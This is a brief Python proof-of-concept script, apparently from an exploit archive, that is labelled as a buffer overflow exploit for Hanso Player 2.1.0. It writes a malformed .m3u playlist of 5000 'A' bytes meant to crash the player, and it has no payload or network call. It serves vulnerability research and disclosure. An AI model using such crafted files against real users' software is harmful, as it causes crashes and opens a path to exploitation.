#!/usr/bin/python
# Exploit Title:Buffer Overflow Vulnerability Hanso Player version 2.1.0
# Download link :www.hansotools.com/downloads/hanso-player-setup.exe
# Author: metacom
# RST
# version: 2.1.0
# Category: poc
# Tested on: windows 7 German  

f=open("fuzzzzz.m3u","w")
print "Creating expoit."

junk="\x41" * 5000

try:    
    f.write(junk)
    f.close()
    print "File created"
except:
    print "File cannot be created"



